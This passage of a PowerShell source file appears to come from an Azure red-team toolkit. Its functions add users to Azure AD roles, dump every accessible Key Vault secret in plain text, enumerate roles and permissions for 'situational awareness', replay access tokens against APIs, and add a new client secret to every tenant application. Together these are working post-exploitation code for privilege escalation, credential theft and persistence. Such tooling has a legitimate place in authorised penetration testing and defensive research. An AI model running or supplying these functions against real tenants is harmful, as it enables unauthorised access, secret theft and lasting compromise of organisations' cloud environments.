        $Role = Get-AzureADDirectoryRole | ? { $_.ObjectId -eq $RoleName -or $_.DisplayName -eq $RoleName}

        if ($Role -eq $null -or $Role.ObjectId -eq $null) {
            Write-Error "Could not find target group with name: $RoleName"
            Return
        }

        Add-AzureADDirectoryRoleMember -ObjectId $Role.ObjectId -RefObjectId $User.ObjectId

        Write-Host "[+] Added user $($User.DisplayName) to Azure AD Role $($Role.DisplayName) ($($Role.ObjectId))"
    }
    catch {
        Write-Host "[!] Function failed!" -ForegroundColor Red
        Throw
        Return
    }
    finally {
        $ErrorActionPreference = $EA
    }
}


Function Get-ARTKeyVaultSecrets {
    <#
    .SYNOPSIS
        Displays all the available Key Vault secrets user can access.

    .DESCRIPTION
        Lists all available Azure Key Vault secrets. 
        This cmdlet assumes that requesting user connected to the Azure AD with KeyVaultAccessToken 
        (scoped to https://vault.azure.net) and has "Key Vault Secrets User" role assigned (or equivalent).

    .EXAMPLE
        PS> Get-ARTKeyVaultSecrets
    #>
    [CmdletBinding()]
    Param(
    )
    
    try {
        $EA = $ErrorActionPreference
        $ErrorActionPreference = 'silentlycontinue'

        $Coll = New-Object System.Collections.ArrayList
        
        Get-AzKeyVault | % {
            $VaultName = $_.VaultName

            Get-AzKeyVaultSecret -VaultName $VaultName | % {
                $SecretName = $_.Name

                $value = Get-AzKeyVaultSecret -VaultName $VaultName -Name $SecretName -AsPlainText

                $obj = [PSCustomObject]@{
                    VaultName = $VaultName
                    Name      = $SecretName
                    Value     = $value
                    Created   = $_.Created
                    Updated   = $_.Updated
                    Enabled   = $_.Enabled
                }

                $null = $Coll.Add($obj)
            }
        }

        Return $Coll
    }
    catch {
        Write-Host "[!] Function failed!" -ForegroundColor Red
        Throw
        Return
    }
    finally {
        $ErrorActionPreference = $EA
    }
}


Function Get-ARTADRoleAssignment {
    <#
    .SYNOPSIS
        Displays Azure AD Role assignment.

    .DESCRIPTION
        Displays Azure AD Role assignments on a current user or on all Azure AD users.

    .PARAMETER All
        Display all Azure AD role assignments

    .EXAMPLE
        Example 1: Get current user Azure AD Role Assignment
        PS> Get-ARTADRoleAssignment

        Example 2: Get all users Azure AD Role Assignments
        PS> Get-ARTADRoleAssignment -All
    #>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$False)]
        [Switch]
        $All
    )

    try {
        $EA = $ErrorActionPreference
        $ErrorActionPreference = 'silentlycontinue'

        $Coll = New-Object System.Collections.ArrayList
        $UserId = Get-ARTUserId
        $count = 0
        
        Get-AzureADDirectoryRole | % { 
            Write-Verbose "Enumerating role `"$($_.DisplayName)`" ..."
            $members = Get-AzureADDirectoryRoleMember -ObjectId $_.ObjectId
            
            $RoleName = $_.DisplayName
            $RoleId = $_.ObjectId

            $members | % { 
                $obj = [PSCustomObject]@{
                    DisplayName      = $_.DisplayName
                    AssignedRoleName = $RoleName
                    ObjectType       = $_.ObjectType
                    AccountEnabled   = $_.AccountEnabled
                    ObjectId         = $_.ObjectId
                    AssignedRoleId   = $RoleId
                }

                if ($All -or $_.ObjectId -eq $UserId) {
                    $null = $Coll.Add($obj)
                    $count += 1
                }
            }
        }

        $Coll

        if($count -eq 0) {
            Write-Host "[-] No Azure AD Role assignment found.`n" -ForegroundColor Red
        }
    }
    catch {
        Write-Host "[!] Function failed!" -ForegroundColor Red
        Throw
        Return
    }
    finally {
        $ErrorActionPreference = $EA
    }
}


Function Get-ARTADScopedRoleAssignment {
    <#
    .SYNOPSIS
        Displays Azure AD Scoped Role assignment - those associated with Administrative Units

    .DESCRIPTION
        Displays Azure AD Scoped Role assignments on a current user or on all Azure AD users, associated with Administrative Units

    .PARAMETER All
        Display all Azure AD role assignments

    .EXAMPLE
        Example 1: Get current user Azure AD Scoped Role Assignment
        PS> Get-ARTADScopedRoleAssignment

        Example 2: Get all users Azure AD Scoped Role Assignments
        PS> Get-ARTADScopedRoleAssignment -All
    #>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$False)]
        [Switch]
        $All
    )

    try {
        $EA = $ErrorActionPreference
        $ErrorActionPreference = 'silentlycontinue'

        $Coll = New-Object System.Collections.ArrayList
        $UserId = Get-ARTUserId
        $count = 0
        
        Get-AzureADMSAdministrativeUnit | % { 
            Write-Verbose "Enumerating Scoped role `"$($_.DisplayName)`" ..."
            $members = Get-AzureADMSScopedRoleMembership -Id $_.Id
            
            $RoleName        = $_.DisplayName
            $RoleId          = $_.Id
            $RoleDescription = $_.Description

            $members | % { 
                $obj = [PSCustomObject]@{
                    DisplayName           = $_.RoleMemberInfo.DisplayName
                    ScopedRoleName        = $RoleName
                    UserId                = $_.RoleMemberInfo.Id
                    UserPrincipalName     = $_.RoleMemberInfo.UserPrincipalName
                    ScopedRoleId          = $RoleId
                    ScopedRoleDescription = $RoleDescription
                }

                if (($All) -or ($_.RoleMemberInfo.Id -eq $UserId)) {
                    $null = $Coll.Add($obj)
                    $count += 1
                }
            }
        }

        $Coll

        if($count -eq 0) {
            Write-Host "[-] No Azure AD Scoped Role assignment found.`n" -ForegroundColor Red
        }
    }
    catch {
        Write-Host "[!] Function failed!" -ForegroundColor Red
        Throw
        Return
    }
    finally {
        $ErrorActionPreference = $EA
    }
}


Function Get-ARTAccess {
    <#
    .SYNOPSIS
        Performs Azure Situational Awareness.

    .PARAMETER SubscriptionId
        Optional parameter specifying Subscription to examine.

    .DESCRIPTION
        Enumerate all accessible Azure resources, permissions, roles assigned for a quick Situational Awareness.

    .EXAMPLE
        PS> Get-ARTAccess -Verbose
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$False)]
        [String]
        $SubscriptionId = $null
    )

    try {
        $EA = $ErrorActionPreference
        $ErrorActionPreference = 'silentlycontinue'

        try {
            if($SubscriptionId -eq $null -or $SubscriptionId.Length -eq 0) {
                $SubscriptionId = Get-ARTSubscriptionId
            }

            Set-AzContext -Subscription $SubscriptionId | Out-Null

            $res = Get-AzResource

            Write-Verbose "Step 1. Checking Dangerous Permissions that User has on Azure Resources..."

            Write-Host "`n=== Dangerous Permissions on Azure Resources:`n" -ForegroundColor Yellow
            $res = Get-ARTDangerousPermissions -SubscriptionId $SubscriptionId

            if ($res -ne $null -and $res.Length -gt 0) {
                Write-Host "[+] Following Dangerous Permissions were Identified on Azure Resources:" -ForegroundColor Green
                $res
            }
            else {
                Write-Host "[-] User does not have any well-known dangerous permissions." -ForegroundColor Red
            }

            Write-Verbose "Step 2. Checking accessible Azure Resources..."

            Write-Host "`n=== Accessible Azure Resources:`n" -ForegroundColor Yellow
            $res = Get-ARTResource -SubscriptionId $SubscriptionId

            if ($res -ne $null -and $res.Length -gt 0) {
                Write-Host "[+] Accessible Azure Resources & corresponding permissions:" -ForegroundColor Green
                $res
            }
            else {
                Write-Host "[-] User does not have access to any Azure Resource." -ForegroundColor Red
            }

            try {
                Write-Verbose "Step 3. Checking assigned Azure RBAC Roles..."
                Write-Host "`n=== Assigned Azure RBAC Roles:`n" -ForegroundColor Yellow

                $roles = Get-ARTRoleAssignment -SubscriptionId $SubscriptionId
                if ($roles -ne $null -and $roles.Length -gt 0) {
                    Write-Host "[+] Azure RBAC Roles Assigned:" -ForegroundColor Green
                    $roles | ft
                }
                else {
                    Write-Host "[-] User does not have any Azure RBAC Role assigned." -ForegroundColor Red
                }
            }
            catch {
                Write-Host "[-] User does not have any Azure RBAC Role assigned." -ForegroundColor Red
            }

            try {
                Write-Verbose "Step 4. Checking accessible Azure Key Vault Secrets..."
                Write-Host "`n=== Accessible Azure Key Vault Secrets:`n" -ForegroundColor Yellow
                $secrets = Get-ARTKeyVaultSecrets

                if ($secrets -ne $null) {
                    Write-Host "[+] Azure Key Vault Secrets accessible:" -ForegroundColor Green
                    $secrets
                }
                else {
                    Write-Host "[-] User could not access Key Vault Secrets or there were no available." -ForegroundColor Red
                }
            }
            catch {
                Write-Host "[-] User could not access Key Vault Secrets or there were no available." -ForegroundColor Red
            }

            try {
                Write-Verbose "Step 5. Checking access to Az.AD / AzureAD via Az module..."
                Write-Host "`n=== User Access to Az.AD:`n" -ForegroundColor Yellow
                $users = Get-AzADUser -First 1 -ErrorAction SilentlyContinue

                if ($users -ne $null -and $users.Length -gt 0) {
                    Write-Host "[+] User has access to Azure AD via Az.AD module (e.g. Get-AzADUser)." -ForegroundColor Green
                }
                else {
                    Write-Host "[-] User has no access to Azure AD via Az.AD module (e.g. Get-AzADUser)." -ForegroundColor Red
                }
            }
            catch {
                Write-Host "[-] User has no access to Azure AD via Az.AD module (e.g. Get-AzADUser)." -ForegroundColor Red
            }

            try {
                Write-Verbose "Step 6. Enumerating resource group deployments..."
                Write-Host "`n=== Resource Group Deployments:`n" -ForegroundColor Yellow

                $resourcegroups = Get-AzResourceGroup

                if($resourcegroups -eq $null -or $resourcegroups.Length -eq 0) {
                    Write-Host "[-] No resource groups available to the user." -ForegroundColor Red
                }
                else {
                    $Coll = New-Object System.Collections.ArrayList
        
                    $resourcegroups | % {
                        $deployments = Get-AzResourceGroupDeployment -ResourceGroupName $_.ResourceGroupName -ErrorAction SilentlyContinue

                        $deployments | % {
                            $obj = [PSCustomObject]@{
                                ResourceGroupName  = $_.ResourceGroupName
                                DeploymentName     = $_.DeploymentName
                                Outputs            = $_.Outputs
                                Parameters         = $_.Parameters
                            }

                            $null = $Coll.Add($obj)
                        }
                    }

                    if ($Coll -ne $null) {
                        Write-Host "[+] Following Resource Group Deployments are available to the User:" -ForegroundColor Green

                        $Coll | fl *
                    }
                    else {
                        Write-Host "[-] User has no access to Resource Group Deployments or there were no defined." -ForegroundColor Red
                    }
                }
            }
            catch {
                Write-Host "[-] User has no access to Resource Group Deployments or there were no defined." -ForegroundColor Red
            }
        }
        catch {
            Write-Host "[-] Current User context does not have access to Azure management.`n" -ForegroundColor Red
            
            if ($PSCmdlet.MyInvocation.BoundParameters["Verbose"].IsPresent) {
                throw
            }
        }
    }
    catch {
        Write-Host "[!] Function failed!" -ForegroundColor Red
        Throw
        Return
    }
    finally {
        $ErrorActionPreference = $EA
    }
}


Function Get-ARTADAccess {
    <#
    .SYNOPSIS
        Performs Azure AD Situational Awareness.

    .DESCRIPTION
        Enumerate all Azure AD permissions, roles assigned for a quick Situational Awareness.

    .EXAMPLE
        PS> Get-ARTADAccess -Verbose
    #>
    [CmdletBinding()]
    Param(
    )

    try {
        $EA = $ErrorActionPreference
        $ErrorActionPreference = 'silentlycontinue'

        try {
            $users = Get-AzureADUser

            if ($users -eq $null -or $users.Length -eq 0) {
                Write-Host "[-] User does not have access to Azure AD." -ForegroundColor Red
                Return
            }
            
            Write-Verbose "Step 1. Checking assigned Azure AD Roles..."
            Write-Host "`n=== Azure AD Roles assigned to current user:`n" -ForegroundColor Yellow
            $roles = Get-ARTADRoleAssignment

            if ($roles -ne $null -and $roles.Length -gt 0) {
                Write-Host "[+] Azure AD Roles Assigned:" -ForegroundColor Green
                $roles | ft
            }
            else {
                Write-Host "[-] User does not have any Azure AD Roles assigned." -ForegroundColor Red

                try {
                    if(Get-Command Get-MGContext) {
                        $users = Get-MgUser -ErrorAction SilentlyContinue

                        if ($users -eq $null -or $users.Length -eq 0) {
                            Write-Verbose "[-] User does not have access to Microsoft.Graph either." -ForegroundColor Red
                        }
                        else {
                            $roles = Get-ARTADRoleAssignment
                            if ($roles -ne $null -and $roles.Length -gt 0) {
                                Write-Host "[+] However user does have access via Microsoft Graph to Azure AD - and these are his Roles Assigned:" -ForegroundColor Green
                                $roles | ft
                            }
                        }
                    }
                }
                catch {
                    Write-Verbose "[-] Could not enumerate Azure AD Roles via Microsoft.Graph either."
                }
            }

            Write-Verbose "Step 2. Checking Azure AD Roles that are In-Use..."
            Write-Host "`n=== Azure AD Roles Assigned In Tenant To Different Users:`n" -ForegroundColor Yellow
            
            $Coll = New-Object System.Collections.ArrayList
            $azureadroles = Get-AzureADDirectoryRole

            $azureadroles | % {
                Write-Verbose "Enumerating role `"$($_.DisplayName)`" ..."
                $members = Get-AzureADDirectoryRoleMember -ObjectId $_.ObjectId
            
                $RoleName = $_.DisplayName
                $RoleId = $_.ObjectId
 
                $obj = [PSCustomObject]@{
                    RoleName     = $RoleName
                    MembersCount = $members.Length
                    IsCustom     = -not $_.IsSystem
                    RoleId       = $RoleId
                }

                $null = $Coll.Add($obj)
            }

            if ($Coll -ne $null) {
                Write-Host "[+] Azure AD Roles In-Use:" -ForegroundColor Green
                $Coll | sort -property MembersCount -Descending | ft
            }
            else {
                Write-Host "[-] Could not list Azure AD Roles In-Use." -ForegroundColor Red
            }

            Write-Verbose "Step 3. Examining Administrative Units..."
            Write-Host "`n=== Azure AD Administrative Units:`n" -ForegroundColor Yellow
            
            $Coll = New-Object System.Collections.ArrayList
            $units = Get-AzureADMSAdministrativeUnit

            $units | % {
                Write-Verbose "Enumerating unit `"$($_.DisplayName)`" ..."
                $members = Get-AzureADMSAdministrativeUnitMember -Id $_.Id
 
                $obj = [PSCustomObject]@{
                    AdministrativeUnit   = $_.DisplayName
                    MembersCount         = $members.Length
                    Description          = $_.Description
                    AdministrativeUnitId = $_.Id
                }

                $null = $Coll.Add($obj)
            }

            if ($Coll -ne $null) {
                Write-Host "[+] Azure AD Administrative Units:" -ForegroundColor Green
                $Coll | sort -property MembersCount -Descending | ft
            }
            else {
                Write-Host "[-] Could not list Azure AD Administrative Units." -ForegroundColor Red
            }

            Write-Verbose "Step 4. Checking Azure AD Scoped Roles..."
            Write-Host "`n=== Azure AD Scoped Roles assigned to current user:`n" -ForegroundColor Yellow
            $roles = Get-ARTADScopedRoleAssignment

            if ($roles -ne $null ) {
                Write-Host "[+] Azure AD Scoped Roles Assigned:" -ForegroundColor Green
                $roles | ft
            }
            else {
                Write-Host "[-] User does not have any Azure AD Scoped Roles assigned." -ForegroundColor Red
            }
        }
        catch {
            Write-Host "[-] Current User context does not have access to Azure AD.`n" -ForegroundColor Red
            
            if ($PSCmdlet.MyInvocation.BoundParameters["Verbose"].IsPresent) {
                throw
            }
        }
    }
    catch {
        Write-Host "[!] Function failed!" -ForegroundColor Red
        Throw
        Return
    }
    finally {
        $ErrorActionPreference = $EA
    }
}


Function Invoke-ARTGETRequest {
    <#
    .SYNOPSIS
        Invokes REST Method GET to the specified URI.

    .DESCRIPTION
        Takes Access Token and invokes REST method API request against a specified URI. It also verifies whether provided token has required audience set.

    .PARAMETER Uri
        URI to invoke. For instance: https://graph.microsoft.com/v1.0/applications

    .PARAMETER AccessToken
        Access Token to use for authentication.

    .PARAMETER Json
        Return results as JSON.

    .EXAMPLE
        PS> Invoke-ARTGETRequest -Uri "https://management.azure.com/subscriptions?api-version=2020-01-01" -AccessToken $token
    #>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True)]
        [String]
        $AccessToken,    

        [Parameter(Mandatory=$True)]
        [String]
        $Uri,

        [Parameter(Mandatory=$False)]
        [Switch]
        $Json
    )

    try {
        $EA = $ErrorActionPreference
        $ErrorActionPreference = 'silentlycontinue'

        $parsed = Parse-JWTtokenRT $AccessToken

        $tokenhost = ([System.Uri]$parsed.aud).Host
        $requesthost = ([System.Uri]$Uri).Host

        if($tokenhost -ne $requesthost) {
            Write-Warning "Request Host ($requesthost) differs from Token Audience host ($tokenhost). Authentication failure may occur."
        }

        $params = @{
            Method  = 'GET'
            Uri     = $Uri
            Headers = @{
                'Authorization' = "Bearer $AccessToken"
            }
        }

        $out = (Invoke-RestMethod @params).value

        if($Json) {
            $out | ConvertTo-Json
        }
        else {
            $out
        }
    }
    catch {
        Write-Host "[!] Function failed!" -ForegroundColor Red
        Throw
        Return
    }
    finally {
        $ErrorActionPreference = $EA
    }
}


#
# This function is (probably) authored by:
#    Nikhil Mittal, @nikhil_mitt
#    https://twitter.com/nikhil_mitt
#
# Code was taken from Nikhil's Azure Red Team Bootcamp:
#   C:\AzAD\Tools\Add-AzADAppSecret.ps1
#
Function Add-ARTADAppSecret {
    <#
    .SYNOPSIS
        Add client secret to the applications.

    .PARAMETER AccessToken
        Pass the Graph API Token.

    .EXAMPLE
        PS C:\> Add-ARTADAppSecret -AccessToken 'eyJ0eX..'

    .LINK
        https://twitter.com/nikhil_mitt
        https://docs.microsoft.com/en-us/graph/api/application-list?view=graph-rest-1.0&tabs=http
        https://docs.microsoft.com/en-us/graph/api/application-addpassword?view=graph-rest-1.0&tabs=http
    #>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True)]
        [String]
        $AccessToken = $null
    )

    try {
        $EA = $ErrorActionPreference
        $ErrorActionPreference = 'silentlycontinue'

        $AppList = $null
        $AppPassword = $null

        $parsed = Parse-JWTtokenRT $AccessToken

        $tokenhost = ([System.Uri]$parsed.aud).Host
        $requesthost = "graph.microsoft.com"

        if($tokenhost -ne $requesthost) {
            Write-Warning "Supplied Access Token's Audience host `"$tokenhost`" is not `"https://graph.microsoft.com`"! Authentication failure may occur."
        }

        # List All the Applications
        $Params = @{
             "URI"     = "https://graph.microsoft.com/v1.0/applications"
             "Method"  = "GET"
             "Headers" = @{
                "Content-Type"  = "application/json"
                "Authorization" = "Bearer $AccessToken"
            }
        }

        try { 
            $AppList = Invoke-RestMethod @Params -UseBasicParsing
        }
        catch {
        }

        # Add Password in the Application
        if($AppList -ne $null) {

            [System.Collections.ArrayList]$Details = @()

            foreach($App in $AppList.value) {
                $ID = $App.ID
                $psobj = New-Object PSObject

                $Params = @{
                    "URI"     = "https://graph.microsoft.com/v1.0/applications/$ID/addPassword"
                    "Method"  = "POST"
                    "Headers" = @{
                        "Content-Type"  = "application/json"
                        "Authorization" = "Bearer $AccessToken"
                    }
                }

                $Body = @{
                    "passwordCredential"= @{
                        "displayName" = "Password"
                    }
                }
     
                try {
                    $AppPassword = Invoke-RestMethod @Params -UseBasicParsing -Body ($Body | ConvertTo-Json)
                    Add-Member -InputObject $psobj -NotePropertyName "Object ID" -NotePropertyValue $ID
                    Add-Member -InputObject $psobj -NotePropertyName "App ID" -NotePropertyValue $App.appId
                    Add-Member -InputObject $psobj -NotePropertyName "App Name" -NotePropertyValue $App.displayName
                    Add-Member -InputObject $psobj -NotePropertyName "Key ID" -NotePropertyValue $AppPassword.keyId
                    Add-Member -InputObject $psobj -NotePropertyName "Secret" -NotePropertyValue $AppPassword.secretText
                    $Details.Add($psobj) | Out-Null
                }
                catch {
                    Write-Output "Failed to add new client secret to '$($App.displayName)' Application." 
                }
            }

            if($Details -ne $null) {
                Write-Output "`nClient secret added to:" 
                Write-Output $Details | fl *
            }
        }
        else {
           Write-Output "Failed to Enumerate the Applications."
        }
    }
    catch {
        Write-Host "[!] Function failed!" -ForegroundColor Red
        Throw
        Return
    }
    finally {
        $ErrorActionPreference = $EA
    }
}


Function Get-ARTAzureVMPublicIP {
    <#
    .SYNOPSIS
        Retrieves Azure VM Public IP address

    .DESCRIPTION
        Retrieves Azure VM Public IP Address

    .PARAMETER VMName
        Specifies Azure VM name to target.

    .PARAMETER ResourceGroupName
        Target Azure Resource Group name.

    .EXAMPLE
        PS> Get-ARTAzureVMPublicIP -VMName MyVM1
    #>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$True)]
        [String]
        $VMName,

        [Parameter(Mandatory=$False)]
        [String]
        $ResourceGroupName = $null
    )

    try {
        $EA = $ErrorActionPreference
        $ErrorActionPreference = 'silentlycontinue'

        if($ResourceGroupName -eq $null -or $ResourceGroupName.Length -eq 0) {
            Write-Verbose "Searching for a specified VM..."

            Get-AzVM | % {
                if($_.name -eq $VMName) {
                    $ResourceGroupName = $_.ResourceGroupName
                    Write-Verbose "Found Azure VM: $($_.Name) / $($_.ResourceGroupName)"
                    break
                }
            }
        }

        (get-azvm -ResourceGroupName $ResourceGroupName -VMName $VMName | select -ExpandProperty NetworkProfile).NetworkInterfaces | % { 
            (Get-AzPublicIpAddress -Name $_.Id).IpAddress 
        }
    }
    catch {
        Write-Host "[!] Function failed!" -ForegroundColor Red
        Throw
        Return
    }
    finally {
        $ErrorActionPreference = $EA
    }
}